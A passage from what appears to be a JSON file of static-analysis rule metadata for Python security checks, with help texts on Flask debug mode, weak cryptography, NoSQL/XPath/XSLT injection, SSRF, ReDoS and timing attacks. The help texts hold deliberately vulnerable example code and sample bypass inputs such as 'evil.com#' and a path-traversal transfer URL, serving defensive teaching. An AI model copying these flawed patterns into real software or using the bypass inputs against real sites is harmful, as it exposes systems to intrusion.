    "filename": "6b963f1b-FlaskDebug",
    "language": "python",
    "help": "# Flask app is run in debug mode\nRunning a Flask application with debug mode enabled may allow an attacker to gain access through the Werkzeug debugger.\n\n\n## Recommendation\nEnsure that Flask applications that are run in a production environment have debugging disabled.\n\n\n## Example\nRunning the following code starts a Flask webserver that has debugging enabled. By visiting `/crash`, it is possible to gain access to the debugger, and run arbitrary code through the interactive debugger.\n\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__)\n\n@app.route('/crash')\ndef main():\n    raise Exception()\n\napp.run(debug=True)\n\n```\n\n## References\n* Flask Quickstart Documentation: [Debug Mode](http://flask.pocoo.org/docs/1.0/quickstart/#debug-mode).\n* Werkzeug Documentation: [Debugging Applications](http://werkzeug.pocoo.org/docs/0.14/debug/).\n* Common Weakness Enumeration: [CWE-215](https://cwe.mitre.org/data/definitions/215.html).\n* Common Weakness Enumeration: [CWE-489](https://cwe.mitre.org/data/definitions/489.html).\n"
  },
  "py/weak-crypto-key": {
    "name": "Use of weak cryptographic key",
    "description": "Use of a cryptographic key that is too small may allow the encryption to be broken.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "py/weak-crypto-key",
    "tags": [
      "security",
      "external/cwe/cwe-326"
    ],
    "filename": "f46a1da4-WeakCryptoKey",
    "language": "python",
    "help": "# Use of weak cryptographic key\nModern encryption relies on it being computationally infeasible to break the cipher and decode a message without the key. As computational power increases, the ability to break ciphers grows and keys need to become larger.\n\nThe three main asymmetric key algorithms currently in use are Rivest\u2013Shamir\u2013Adleman (RSA) cryptography, Digital Signature Algorithm (DSA), and Elliptic-curve cryptography (ECC). With current technology, key sizes of 2048 bits for RSA and DSA, or 256 bits for ECC, are regarded as unbreakable.\n\n\n## Recommendation\nIncrease the key size to the recommended amount or larger. For RSA or DSA this is at least 2048 bits, for ECC this is at least 256 bits.\n\n\n## References\n* Wikipedia: [Digital Signature Algorithm](https://en.wikipedia.org/wiki/Digital_Signature_Algorithm).\n* Wikipedia: [RSA cryptosystem](https://en.wikipedia.org/wiki/RSA_(cryptosystem)).\n* Wikipedia: [Elliptic-curve cryptography](https://en.wikipedia.org/wiki/Elliptic-curve_cryptography).\n* Python cryptography module: [cryptography.io](https://cryptography.io/en/latest/).\n* NIST: [ Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf).\n* Common Weakness Enumeration: [CWE-326](https://cwe.mitre.org/data/definitions/326.html).\n"
  },
  "py/nosql-injection": {
    "name": "NoSQL Injection",
    "description": "Building a NoSQL query from user-controlled sources is vulnerable to insertion of malicious NoSQL code by the user.",
    "kind": "path-problem",
    "precision": "high",
    "problem.severity": "error",
    "security-severity": 8.8,
    "id": "py/nosql-injection",
    "tags": [
      "security",
      "external/cwe/cwe-943"
    ],
    "filename": "b7b60521-NoSqlInjection",
    "language": "python",
    "help": "# NoSQL Injection\nPassing user-controlled sources into NoSQL queries can result in a NoSQL injection flaw. This tainted NoSQL query containing a user-controlled source can then execute a malicious query in a NoSQL database such as MongoDB. In order for the user-controlled source to taint the NoSQL query, the user-controller source must be converted into a Python object using something like `json.loads` or `xmltodict.parse`.\n\nBecause a user-controlled source is passed into the query, the malicious user can have complete control over the query itself. When the tainted query is executed, the malicious user can commit malicious actions such as bypassing role restrictions or accessing and modifying restricted data in the NoSQL database.\n\n\n## Recommendation\nNoSQL injections can be prevented by escaping user-input's special characters that are passed into the NoSQL query from the user-supplied source. Alternatively, using a sanitize library such as MongoSanitizer will ensure that user-supplied sources can not act as a malicious query.\n\n\n## Example\nIn the example below, the user-supplied source is passed to a MongoDB function that queries the MongoDB database.\n\n\n```python\nfrom flask import Flask, request\nfrom flask_pymongo import PyMongo\nimport json\n\nmongo = PyMongo(app)\n\n\n@app.route(\"/\")\ndef home_page():\n    unsanitized_search = request.args['search']\n    json_search = json.loads(unsanitized_search)\n\n    result = mongo.db.user.find({'name': json_search})\n\n```\nThis can be fixed by using a sanitizer library like MongoSanitizer as shown in this annotated code version below.\n\n\n```python\nfrom flask import Flask, request\nfrom flask_pymongo import PyMongo\nfrom mongosanitizer.sanitizer import sanitize\nimport json\n\nmongo = PyMongo(app)\n\n\n@app.route(\"/\")\ndef home_page():\n    unsafe_search = request.args['search']\n    json_search = json.loads(unsafe_search)\n    safe_search = sanitize(unsanitized_search)\n\n    result = client.db.collection.find_one({'data': safe_search})\n\n```\n\n## References\n* Mongoengine: [Documentation](http://mongoengine.org/).\n* Flask-Mongoengine: [Documentation](http://docs.mongoengine.org/projects/flask-mongoengine/en/latest/).\n* PyMongo: [Documentation](https://pypi.org/project/pymongo/).\n* Flask-PyMongo: [Documentation](https://flask-pymongo.readthedocs.io/en/latest/).\n* OWASP: [NoSQL Injection](https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf).\n* Security Stack Exchange Discussion: [Question 83231](https://security.stackexchange.com/questions/83231/mongodb-nosql-injection-in-python-code).\n* Common Weakness Enumeration: [CWE-943](https://cwe.mitre.org/data/definitions/943.html).\n"
  },
  "py/weak-cryptographic-algorithm": {
    "name": "Use of a broken or weak cryptographic algorithm",
    "description": "Using broken or weak cryptographic algorithms can compromise security.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "py/weak-cryptographic-algorithm",
    "tags": [
      "security",
      "external/cwe/cwe-327"
    ],
    "filename": "c6fd54e6-BrokenCryptoAlgorithm",
    "language": "python",
    "help": "# Use of a broken or weak cryptographic algorithm\nUsing broken or weak cryptographic algorithms can leave data vulnerable to being decrypted or forged by an attacker.\n\nMany cryptographic algorithms provided by cryptography libraries are known to be weak, or flawed. Using such an algorithm means that encrypted or hashed data is less secure than it appears to be.\n\nThis query alerts on any use of a weak cryptographic algorithm, that is not a hashing algorithm. Use of broken or weak cryptographic hash functions are handled by the `py/weak-sensitive-data-hashing` query.\n\n\n## Recommendation\nEnsure that you use a strong, modern cryptographic algorithm, such as AES-128 or RSA-2048.\n\n\n## Example\nThe following code uses the `pycryptodome` library to encrypt some secret data. When you create a cipher using `pycryptodome` you must specify the encryption algorithm to use. The first example uses DES, which is an older algorithm that is now considered weak. The second example uses AES, which is a stronger modern algorithm.\n\n\n```python\nfrom Crypto.Cipher import DES, AES\n\ncipher = DES.new(SECRET_KEY)\n\ndef send_encrypted(channel, message):\n    channel.send(cipher.encrypt(message)) # BAD: weak encryption\n\n\ncipher = AES.new(SECRET_KEY)\n\ndef send_encrypted(channel, message):\n    channel.send(cipher.encrypt(message)) # GOOD: strong encryption\n\n\n```\nNOTICE: the original `[pycrypto](https://pypi.org/project/pycrypto/)` PyPI package that provided the `Crypto` module is not longer actively maintained, so you should use the `[pycryptodome](https://pypi.org/project/pycryptodome/)` PyPI package instead (which has a compatible API).\n\n\n## References\n* NIST, FIPS 140 Annex a: [ Approved Security Functions](http://csrc.nist.gov/publications/fips/fips140-2/fips1402annexa.pdf).\n* NIST, SP 800-131A: [ Transitions: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths](http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf).\n* OWASP: [Rule - Use strong approved cryptographic algorithms](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#rule---use-strong-approved-authenticated-encryption).\n* Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).\n"
  },
  "py/timing-attack-sensitive-info": {
    "name": "Timing attack against secret",
    "description": "Use of a non-constant-time verification routine to check the value of an secret, possibly allowing a timing attack to retrieve sensitive information.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "low",
    "id": "py/timing-attack-sensitive-info",
    "tags": [
      "security",
      "external/cwe/cwe-208",
      "experimental"
    ],
    "filename": "3cef9ed8-TimingAttackAgainstSensitiveInfo",
    "language": "python",
    "help": "# Timing attack against secret\nTiming Attack is based on the leakage of information of secret parameters by studying how long it takes the system to respond to different inputs. it can be circumvented by using a constant-time algorithm for checking the value of sensitive info, more precisely, the comparison time should not depend on the content of the input. Otherwise the attacker gains information that is indirectly leaked by the application. This information is then used for malicious purposes.\n\n\n## Recommendation\nTwo types of countermeasures can be applied against timing attacks. The first one consists in eliminating timing variations whereas the second renders these variations useless for an attacker. The only absolute way to prevent timing attacks is to make the computation strictly constant time, independent of the input. Use `hmac.compare_digest()` method to securely check the value of sensitive info. If this method is used, then the calculation time depends only on the length of input byte arrays, and does not depend on the contents of the arrays. Unlike `==` is a fail fast check, If the first byte is not equal, it will return immediately.\n\n\n## Example\nThe following example uses `==` which is a fail fast check for validating a secret.\n\n\n```python\n#!/usr/bin/env python\n# -*- coding: UTF-8 -*-\n\"\"\"\n@Desc   \uff1atiming attack against sensitive info\n\"\"\"\n\nfrom flask import Flask\nfrom flask import request\n\n@app.route('/bad', methods = ['POST', 'GET'])\ndef bad():\n    if request.method == 'POST':\n        password = request.form['pwd']\n        return password == \"test\"\n    \nif __name__ == '__main__':\n    app.debug = True\n    app.run() \n\n```\nThe next example use a safe constant-time algorithm for validating a secret:\n\n\n```python\n#!/usr/bin/env python\n# -*- coding: UTF-8 -*-\n\n\"\"\"\n@Desc   \uff1apreventing timing attack sensitive info\n\"\"\"\nfrom flask import Flask\nfrom flask import request\nimport hmac\n\napp = Flask(__name__)\n\n@app.route('/bad', methods = ['POST', 'GET'])\ndef bad():\n    if request.method == 'POST':\n        password = request.form['pwd']\n        return hmac.compare_digest(password, \"1234\")\n    \nif __name__ == '__main__':\n    app.debug = True\n    app.run() \n\n```\n\n## References\n* Wikipedia: [Timing attack](https://en.wikipedia.org/wiki/Timing_attack).\n* [hmac.compare_digest() method](https://docs.python.org/3/library/hmac.html#hmac.compare_digest)\n* Common Weakness Enumeration: [CWE-208](https://cwe.mitre.org/data/definitions/208.html).\n"
  },
  "py/possible-timing-attack-sensitive-info": {
    "name": "Timing attack against secret",
    "description": "Use of a non-constant-time verification routine to check the value of an secret, possibly allowing a timing attack to retrieve sensitive information.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "low",
    "id": "py/possible-timing-attack-sensitive-info",
    "tags": [
      "security",
      "external/cwe/cwe-208",
      "experimental"
    ],
    "filename": "3cef9ed8-PossibleTimingAttackAgainstSensitiveInfo",
    "language": "python",
    "help": "# Timing attack against secret\nTiming Attack is based on the leakage of information of secret parameters by studying how long it takes the system to respond to different inputs. it can be circumvented by using a constant-time algorithm for checking the value of sensitive info, more precisely, the comparison time should not depend on the content of the input. Otherwise the attacker gains information that is indirectly leaked by the application. This information is then used for malicious purposes.\n\n\n## Recommendation\nTwo types of countermeasures can be applied against timing attacks. The first one consists in eliminating timing variations whereas the second renders these variations useless for an attacker. The only absolute way to prevent timing attacks is to make the computation strictly constant time, independent of the input. Use `hmac.compare_digest()` method to securely check the value of sensitive info. If this method is used, then the calculation time depends only on the length of input byte arrays, and does not depend on the contents of the arrays. Unlike `==` is a fail fast check, If the first byte is not equal, it will return immediately.\n\n\n## Example\nThe following example uses `==` which is a fail fast check for validating a secret.\n\n\n```python\n#!/usr/bin/env python\n# -*- coding: UTF-8 -*-\n\"\"\"\n@Desc   \uff1atiming attack against sensitive info\n\"\"\"\n\nfrom flask import Flask\nfrom flask import request\n\n@app.route('/bad', methods = ['POST', 'GET'])\ndef bad():\n    if request.method == 'POST':\n        password = request.form['pwd']\n        return password == \"test\"\n    \nif __name__ == '__main__':\n    app.debug = True\n    app.run() \n\n```\nThe next example use a safe constant-time algorithm for validating a secret:\n\n\n```python\n#!/usr/bin/env python\n# -*- coding: UTF-8 -*-\n\n\"\"\"\n@Desc   \uff1apreventing timing attack sensitive info\n\"\"\"\nfrom flask import Flask\nfrom flask import request\nimport hmac\n\napp = Flask(__name__)\n\n@app.route('/bad', methods = ['POST', 'GET'])\ndef bad():\n    if request.method == 'POST':\n        password = request.form['pwd']\n        return hmac.compare_digest(password, \"1234\")\n    \nif __name__ == '__main__':\n    app.debug = True\n    app.run() \n\n```\n\n## References\n* Wikipedia: [Timing attack](https://en.wikipedia.org/wiki/Timing_attack).\n* [hmac.compare_digest() method](https://docs.python.org/3/library/hmac.html#hmac.compare_digest)\n* Common Weakness Enumeration: [CWE-208](https://cwe.mitre.org/data/definitions/208.html).\n"
  },
  "py/incomplete-url-substring-sanitization": {
    "name": "Incomplete URL substring sanitization",
    "description": "Security checks on the substrings of an unparsed URL are often vulnerable to bypassing.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "py/incomplete-url-substring-sanitization",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-20"
    ],
    "filename": "dfdda0ff-IncompleteUrlSubstringSanitization",
    "language": "python",
    "help": "# Incomplete URL substring sanitization\nSanitizing untrusted URLs is a common technique for preventing attacks such as request forgeries and malicious redirections. Usually, this is done by checking that the host of a URL is in a set of allowed hosts.\n\nHowever, treating the URL as a string and checking if one of the allowed hosts is a substring of the URL is very prone to errors. Malicious URLs can bypass such security checks by embedding one of the allowed hosts in an unexpected location.\n\nEven if the substring check is not used in a security-critical context, the incomplete check may still cause undesirable behaviors when the check succeeds accidentally.\n\n\n## Recommendation\nParse a URL before performing a check on its host value, and ensure that the check handles arbitrary subdomain sequences correctly.\n\n\n## Example\nThe following example code checks that a URL redirection will reach the `example.com` domain.\n\n\n```python\nfrom flask import Flask, request, redirect\nfrom urllib.parse import urlparse\n\napp = Flask(__name__)\n\n# Not safe, as \"evil-example.net/example.com\" would be accepted\n\n@app.route('/some/path/bad1')\ndef unsafe1(request):\n    target = request.args.get('target', '')\n    if \"example.com\" in target:\n        return redirect(target)\n\n# Not safe, as \"benign-looking-prefix-example.com\" would be accepted\n\n@app.route('/some/path/bad2')\ndef unsafe2(request):\n    target = request.args.get('target', '')\n    if target.endswith(\"example.com\"):\n        return redirect(target)\n\n\n\n#Simplest and safest approach is to use an allowlist\n\n@app.route('/some/path/good1')\ndef safe1(request):\n    allowlist = [\n        \"example.com/home\",\n        \"example.com/login\",\n    ]\n    target = request.args.get('target', '')\n    if target in allowlist:\n        return redirect(target)\n\n#More complex example allowing sub-domains.\n\n@app.route('/some/path/good2')\ndef safe2(request):\n    target = request.args.get('target', '')\n    host = urlparse(target).hostname\n    #Note the '.' preceding example.com\n    if host and host.endswith(\".example.com\"):\n        return redirect(target)\n\n\n```\nThe first two examples show unsafe checks that are easily bypassed. In `unsafe1` the attacker can simply add `example.com` anywhere in the url. For example, `http://evil-example.net/example.com`.\n\nIn `unsafe2` the attacker must use a hostname ending in `example.com`, but that is easy to do. For example, `http://benign-looking-prefix-example.com`.\n\nThe second two examples show safe checks. In `safe1`, an allowlist is used. Although fairly inflexible, this is easy to get right and is most likely to be safe.\n\nIn `safe2`, `urlparse` is used to parse the URL, then the hostname is checked to make sure it ends with `.example.com`.\n\n\n## References\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "py/predictable-token": {
    "name": "Predictable token",
    "description": "Tokens used for sensitive tasks, such as, password recovery, and email confirmation, should not use predictable values.",
    "kind": "path-problem",
    "precision": "medium",
    "problem.severity": "error",
    "security-severity": 5.0,
    "id": "py/predictable-token",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-340"
    ],
    "filename": "d73e5d2a-TokenBuiltFromUUID",
    "language": "python",
    "help": "# Predictable token\nGUIDs (often called UUIDs) are widely used in modern web applications. One common use for UUIDs is the generation of one-time-use tokens. These can used for password reset, and e-mail confirmation routines, for example.\n\nThere are five versions of UUIDs defined in RFC 4122. Out of the five, four are generated in a predictable manner. This means it is possible for someone to predict future UUIDs based on a sample generated by the target application.\n\nVersion four is the only UUID version expected to be randomly generated. Therefore, for situations where predictable tokens are not desired (e.g. password reset tokens), all other versions should be avoided.\n\n\n## Recommendation\nWhen using GUIDs/UUIDs for generating tokens that should not be predictable, use version four.\n\n\n## Example\nThis example shows a UUID v1 being used for a password reset routine.\n\n\n```python\nimport uuid\n\n\nclass User:\n    def __init__(self):\n        self.token = None\n\n    def resetPassword(self):\n        self.token = uuid.uuid1().hex\n\n\nuser = User()\nuser.resetPassword()\n\n```\n\n## References\n* UUID [RFC](https://datatracker.ietf.org/doc/html/rfc4122).\n* Daniel Thatcher *In GUID We Trust* [article](https://www.intruder.io/research/in-guid-we-trust).\n* UUID exploitation [tool](https://github.com/intruder-io/guidtool).\n* Common Weakness Enumeration: [CWE-340](https://cwe.mitre.org/data/definitions/340.html).\n"
  },
  "py/xpath-injection": {
    "name": "XPath query built from user-controlled sources",
    "description": "Building a XPath query from user-controlled sources is vulnerable to insertion of malicious Xpath code by the user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "py/xpath-injection",
    "tags": [
      "security",
      "external/cwe/cwe-643"
    ],
    "filename": "05b63d07-XpathInjection",
    "language": "python",
    "help": "# XPath query built from user-controlled sources\nIf an XPath expression is built using string concatenation, and the components of the concatenation include user input, it makes it very easy for a user to create a malicious XPath expression.\n\n\n## Recommendation\nIf user input must be included in an XPath expression, either sanitize the data or use variable references to safely embed it without altering the structure of the expression.\n\n\n## Example\nIn the example below, the xpath query is controlled by the user and hence leads to a vulnerability.\n\n\n```python\nfrom lxml import etree\nfrom io import StringIO\n\nfrom django.urls import path\nfrom django.http import HttpResponse\nfrom django.template import Template, Context, Engine, engines\n\n\ndef a(request):\n    value = request.GET['xpath']\n    f = StringIO('<foo><bar></bar></foo>')\n    tree = etree.parse(f)\n    r = tree.xpath(\"/tag[@id='%s']\" % value)\n\n\nurlpatterns = [\n    path('a', a)\n]\n\n```\nThis can be fixed by using a parameterized query as shown below.\n\n\n```python\nfrom lxml import etree\nfrom io import StringIO\n\nfrom django.urls import path\nfrom django.http import HttpResponse\nfrom django.template import Template, Context, Engine, engines\n\n\ndef a(request):\n    value = request.GET['xpath']\n    f = StringIO('<foo><bar></bar></foo>')\n    tree = etree.parse(f)\n    r = tree.xpath(\"/tag[@id=$tagid]\", tagid=value)\n\n\nurlpatterns = [\n    path('a', a)\n]\n\n```\n\n## References\n* OWASP XPath injection : [](https://owasp.org/www-community/attacks/XPATH_Injection)/&gt;&gt;\n* Common Weakness Enumeration: [CWE-643](https://cwe.mitre.org/data/definitions/643.html).\n"
  },
  "py/simple-xml-rpc-server-dos": {
    "name": "SimpleXMLRPCServer denial of service",
    "description": "SimpleXMLRPCServer is vulnerable to denial of service attacks from untrusted user input",
    "kind": "problem",
    "problem.severity": "warning",
    "precision": "high",
    "id": "py/simple-xml-rpc-server-dos",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-776"
    ],
    "filename": "0bf773da-SimpleXmlRpcServer",
    "language": "python"
  },
  "py/partial-ssrf": {
    "name": "Partial server-side request forgery",
    "description": "Making a network request to a URL that is partially user-controlled allows for request forgery attacks.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.1,
    "precision": "medium",
    "id": "py/partial-ssrf",
    "tags": [
      "security",
      "external/cwe/cwe-918"
    ],
    "filename": "e3a6333f-PartialServerSideRequestForgery",
    "language": "python",
    "help": "# Partial server-side request forgery\nDirectly incorporating user input into an HTTP request without validating the input can facilitate server-side request forgery (SSRF) attacks. In these attacks, the request may be changed, directed at a different server, or via a different protocol. This can allow the attacker to obtain sensitive information or perform actions with escalated privilege.\n\nWe make a distinctions between how much of the URL an attacker can control:\n\n* **Full SSRF**: where the full URL can be controlled.\n* **Partial SSRF**: where only part of the URL can be controlled, such as the path component of a URL to a hardcoded domain.\n\n\nPartial control of a URL is often much harder to exploit. Therefore we have created a separate query for each of these.\n\nThis query covers partial SSRF, to find full SSRF use the `py/full-ssrf` query.\n\n\n## Recommendation\nTo guard against SSRF attacks you should avoid putting user-provided input directly into a request URL. Instead, either maintain a list of authorized URLs on the server and choose from that list based on the input provided, or perform proper validation of the input.\n\n\n## Example\nThe following example shows code vulnerable to a full SSRF attack, because it uses untrusted input (HTTP request parameter) directly to construct a URL. By using `evil.com#` as the `target` value, the requested URL will be `https://evil.com#.example.com/data/`. It also shows how to remedy the problem by using the user input select a known fixed string.\n\n\n```python\nimport requests\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route(\"/full_ssrf\")\ndef full_ssrf():\n    target = request.args[\"target\"]\n\n    # BAD: user has full control of URL\n    resp = requests.get(\"https://\" + target + \".example.com/data/\")\n\n    # GOOD: `subdomain` is controlled by the server.\n    subdomain = \"europe\" if target == \"EU\" else \"world\"\n    resp = requests.get(\"https://\" + subdomain + \".example.com/data/\")\n\n```\n\n## Example\nThe following example shows code vulnerable to a partial SSRF attack, because it uses untrusted input (HTTP request parameter) directly to construct a URL. By using `../transfer-funds-to/123?amount=456` as the `user_id` value, the requested URL will be `https://api.example.com/transfer-funds-to/123?amount=456`. It also shows how to remedy the problem by validating the input.\n\n\n```python\nimport requests\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route(\"/partial_ssrf\")\ndef partial_ssrf():\n    user_id = request.args[\"user_id\"]\n\n    # BAD: user can fully control the path component of the URL\n    resp = requests.get(\"https://api.example.com/user_info/\" + user_id)\n\n    if user_id.isalnum():\n        # GOOD: user_id is restricted to be alpha-numeric, and cannot alter path component of URL\n        resp = requests.get(\"https://api.example.com/user_info/\" + user_id)\n\n```\n\n## References\n* [OWASP SSRF article](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)\n* [PortSwigger SSRF article](https://portswigger.net/web-security/ssrf)\n* Common Weakness Enumeration: [CWE-918](https://cwe.mitre.org/data/definitions/918.html).\n"
  },
  "py/xslt-injection": {
    "name": "XSLT query built from user-controlled sources",
    "description": "Building a XSLT query from user-controlled sources is vulnerable to insertion of malicious XSLT code by the user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "py/xslt-injection",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-643"
    ],
    "filename": "b43265be-XsltInjection",
    "language": "python",
    "help": "# XSLT query built from user-controlled sources\nProcessing an unvalidated XSL stylesheet can allow an attacker to change the structure and contents of the resultant XML, include arbitrary files from the file system, or execute arbitrary code.\n\n\n## Recommendation\nThis vulnerability can be prevented by not allowing untrusted user input to be passed as an XSL stylesheet. If the application logic necessitates processing untrusted XSL stylesheets, the input should be properly filtered and sanitized before use.\n\n\n## Example\nIn the example below, the XSL stylesheet is controlled by the user and hence leads to a vulnerability.\n\n\n```python\nfrom lxml import etree\nfrom io import StringIO\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n\n@app.route(\"/xslt\")\ndef bad():\n    xsltQuery = request.args.get('xml', '')\n    xslt_root = etree.XML(xsltQuery)\n    f = StringIO('<foo><bar></bar></foo>')\n    tree = etree.parse(f)\n    result_tree = tree.xslt(xslt_root)  # Not OK\n\n```\n"
  },
  "py/regex-injection": {
    "name": "Regular expression injection",
    "description": "User input should not be used in regular expressions without first being escaped, otherwise a malicious user may be able to inject an expression that could require exponential time on certain inputs.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "py/regex-injection",
    "tags": [
      "security",
      "external/cwe/cwe-730",
      "external/cwe/cwe-400"
    ],
    "filename": "19a7ad06-RegexInjection",
    "language": "python",
    "help": "# Regular expression injection\nConstructing a regular expression with unsanitized user input is dangerous as a malicious user may be able to modify the meaning of the expression. In particular, such a user may be able to provide a regular expression fragment that takes exponential time in the worst case, and use that to perform a Denial of Service attack.\n\n\n## Recommendation\nBefore embedding user input into a regular expression, use a sanitization function such as `re.escape` to escape meta-characters that have a special meaning regarding regular expressions' syntax.\n\n\n## Example\nThe following examples are based on a simple Flask web server environment.\n\nThe following example shows a HTTP request parameter that is used to construct a regular expression without sanitizing it first:\n\n\n```python\nfrom flask import request, Flask\nimport re\n\n\n@app.route(\"/direct\")\ndef direct():\n    unsafe_pattern = request.args[\"pattern\"]\n    re.search(unsafe_pattern, \"\")\n\n\n@app.route(\"/compile\")\ndef compile():\n    unsafe_pattern = request.args[\"pattern\"]\n    compiled_pattern = re.compile(unsafe_pattern)\n    compiled_pattern.search(\"\")\n\n```\nInstead, the request parameter should be sanitized first, for example using the function `re.escape`. This ensures that the user cannot insert characters which have a special meaning in regular expressions.\n\n\n```python\nfrom flask import request, Flask\nimport re\n\n\n@app.route(\"/direct\")\ndef direct():\n    unsafe_pattern = request.args['pattern']\n    safe_pattern = re.escape(unsafe_pattern)\n    re.search(safe_pattern, \"\")\n\n\n@app.route(\"/compile\")\ndef compile():\n    unsafe_pattern = request.args['pattern']\n    safe_pattern = re.escape(unsafe_pattern)\n    compiled_pattern = re.compile(safe_pattern)\n    compiled_pattern.search(\"\")\n\n```\n\n## References\n* OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).\n* Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n* Python docs: [re](https://docs.python.org/3/library/re.html).\n* SonarSource: [RSPEC-2631](https://rules.sonarsource.com/python/type/Vulnerability/RSPEC-2631).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "py/stack-trace-exposure": {
    "name": "Information exposure through an exception",
    "description": "Leaking information about an exception, such as messages and stack traces, to an external user can expose implementation details that are useful to an attacker for developing a subsequent exploit.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 5.4,
    "precision": "high",
    "id": "py/stack-trace-exposure",
    "tags": [
      "security",
      "external/cwe/cwe-209",
      "external/cwe/cwe-497"
    ],
    "filename": "11570109-StackTraceExposure",
    "language": "python",
    "help": "# Information exposure through an exception\nSoftware developers often add stack traces to error messages, as a debugging aid. Whenever that error message occurs for an end user, the developer can use the stack trace to help identify how to fix the problem. In particular, stack traces can tell the developer more about the sequence of events that led to a failure, as opposed to merely the final state of the software when the error occurred.\n\nUnfortunately, the same information can be useful to an attacker. The sequence of class names in a stack trace can reveal the structure of the application as well as any internal components it relies on. Furthermore, the error message at the top of a stack trace can include information such as server-side file names and SQL code that the application relies on, allowing an attacker to fine-tune a subsequent injection attack.\n\n\n## Recommendation\nSend the user a more generic error message that reveals less information. Either suppress the stack trace entirely, or log it only on the server.\n\n\n## Example\nIn the following example, an exception is handled in two different ways. In the first version, labeled BAD, the exception is sent back to the remote user by returning it from the function. As such, the user is able to see a detailed stack trace, which may contain sensitive information. In the second version, the error message is logged only on the server, and a generic error message is displayed to the user. That way, the developers can still access and use the error log, but remote users will not see the information.\n\n\n```python\nfrom flask import Flask\napp = Flask(__name__)\n\n\nimport traceback\n\ndef do_computation():\n    raise Exception(\"Secret info\")\n\n# BAD\n@app.route('/bad')\ndef server_bad():\n    try:\n        do_computation()\n    except Exception as e:\n        return traceback.format_exc()\n\n# GOOD\n@app.route('/good')\ndef server_good():\n    try:\n        do_computation()\n    except Exception as e:\n        log(traceback.format_exc())\n        return \"An internal error has occurred!\"\n\n```\n\n## References\n* OWASP: [Improper Error Handling](https://owasp.org/www-community/Improper_Error_Handling).\n* Common Weakness Enumeration: [CWE-209](https://cwe.mitre.org/data/definitions/209.html).\n* Common Weakness Enumeration: [CWE-497](https://cwe.mitre.org/data/definitions/497.html).\n"
  },
  "py/bind-socket-all-network-interfaces": {
    "name": "Binding a socket to all network interfaces",
    "description": "Binding a socket to all interfaces opens it up to traffic from any IPv4 address and is therefore associated with security risks.",
    "kind": "problem",
    "tags": [
      "security",
      "external/cwe/cwe-200"
    ],
    "problem.severity": "error",
    "security-severity": 6.5,
    "sub-severity": "low",
    "precision": "high",
    "id": "py/bind-socket-all-network-interfaces",
    "filename": "08bdfc7b-BindToAllInterfaces",
    "language": "python",
    "help": "# Binding a socket to all network interfaces\nSockets can be used to communicate with other machines on a network. You can use the (IP address, port) pair to define the access restrictions for the socket you create. When using the built-in Python `socket` module (for instance, when building a message sender service or an FTP server data transmitter), one has to bind the port to some interface. When you bind the port to all interfaces using `0.0.0.0` as the IP address, you essentially allow it to accept connections from any IPv4 address provided that it can get to the socket via routing. Binding to all interfaces is therefore associated with security risks.\n\n\n## Recommendation\nBind your service incoming traffic only to a dedicated interface. If you need to bind more than one interface using the built-in `socket` module, create multiple sockets (instead of binding to one socket to all interfaces).\n\n\n## Example\nIn this example, two sockets are insecure because they are bound to all interfaces; one through the `0.0.0.0` notation and another one through an empty string `''`.\n\n\n```python\nimport socket\n\n# binds to all interfaces, insecure\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.bind(('0.0.0.0', 31137))\n\n# binds to all interfaces, insecure\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.bind(('', 4040))\n\n# binds only to a dedicated interface, secure\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.bind(('84.68.10.12', 8080))\n\n```\n\n## References\n* Python reference: [ Socket families](https://docs.python.org/3/library/socket.html#socket-families).\n* Python reference: [ Socket Programming HOWTO](https://docs.python.org/3.7/howto/sockets.html).\n* Common Vulnerabilities and Exposures: [ CVE-2018-1281 Detail](https://nvd.nist.gov/vuln/detail/CVE-2018-1281).\n* Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).\n"
  },
  "py/http-response-splitting": {
    "name": "HTTP Response Splitting",
